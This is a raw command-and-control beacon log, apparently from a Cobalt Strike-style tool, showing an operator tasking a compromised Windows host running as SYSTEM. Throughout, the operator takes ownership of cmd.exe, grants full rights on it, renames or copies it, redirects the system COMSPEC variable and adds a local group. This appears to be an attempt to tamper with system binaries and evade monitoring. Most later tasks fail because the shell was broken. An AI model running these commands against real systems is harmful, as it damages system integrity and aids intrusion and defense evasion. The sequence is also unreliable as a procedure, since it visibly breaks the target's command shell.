02/03 14:49:31 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3492; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 14:50:36 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 14:50:36 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 14:50:36 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 14:50:36 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:50:36 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 14:50:36 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 14:50:36 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:51:28 [checkin] host called home, sent: 537 bytes
02/03 14:51:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 14:51:29 [output]
received output:
错误: 系统找不到指定的文件。


02/03 14:51:29 [output]
received output:
C:\Windows\System32\cmd.exe: 系统找不到指定的文件。
已成功处理 0 个文件; 处理 1 个文件时失败


02/03 14:51:29 [output]
received output:
系统无法在消息文件中为 System 找到消息号为 0x2 的消息文本。


02/03 14:51:29 [output]
received output:

成功: 指定的值已得到保存。


02/03 14:51:29 [output]
received output:
命令成功完成。



02/03 14:52:33 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 14:52:33 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 14:52:33 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 14:52:33 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:52:33 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 14:52:33 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 14:52:33 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:53:29 [checkin] host called home, sent: 537 bytes
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C takeown /F "C:\Windows\System32\cmd.exe" /A: 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F: 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C ren C:\Windows\System32\cmd.exe cmd_back.exe: 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C Net Localgroup Tests /add: 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C ren C:\Windows\System32\cmd_back.exe cmd.exe: 2
02/03 14:53:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 14:57:36 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 14:57:36 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 14:57:36 [task] Tasked beacon to run: ren C:\Windows\System32\cmd.exe cmd_back.exe
02/03 14:57:36 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:57:36 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 14:57:36 [task] Tasked beacon to run: ren C:\Windows\System32\cmd_back.exe cmd.exe
02/03 14:57:36 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 14:58:29 [checkin] host called home, sent: 537 bytes
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C takeown /F "C:\Windows\System32\cmd.exe" /A: 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F: 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C ren C:\Windows\System32\cmd.exe cmd_back.exe: 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C Net Localgroup Tests /add: 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C ren C:\Windows\System32\cmd_back.exe cmd.exe: 2
02/03 14:58:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 15:03:47 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
02/03 15:03:47 [task] Tasked beacon to run: icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F
02/03 15:03:47 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y
02/03 15:03:47 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd_back.exe"
02/03 15:03:47 [task] Tasked beacon to run: Net Localgroup Tests /add
02/03 15:03:47 [task] Tasked beacon to run: del /s /q C:\Windows\System32\cmd_back.exe
02/03 15:03:47 [task] Tasked beacon to run: setx -m comspec "%SystemRoot%\System32\cmd.exe"
02/03 15:04:29 [checkin] host called home, sent: 554 bytes
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C takeown /F "C:\Windows\System32\cmd.exe" /A: 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C icacls "C:\Windows\System32\cmd.exe" /grant Administrators:F: 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C copy C:\Windows\System32\cmd.exe C:\Windows\System32\cmd_back.exe /y: 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd_back.exe": 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C Net Localgroup Tests /add: 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C del /s /q C:\Windows\System32\cmd_back.exe: 2
02/03 15:04:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C setx -m comspec "%SystemRoot%\System32\cmd.exe": 2
02/03 15:06:30 [input] <neo> shell calc
02/03 15:06:30 [task] Tasked beacon to run: calc
02/03 15:07:29 [checkin] host called home, sent: 35 bytes
02/03 15:07:29 [error] could not spawn C:\Windows\System32\cmd_back.exe /C calc: 2
02/03 15:09:53 [input] <neo> exit
02/03 15:09:53 [task] Tasked beacon to exit
02/03 15:10:33 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3492; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/03 15:10:29 [checkin] host called home, sent: 8 bytes
02/03 15:10:29 [output]
beacon exit.

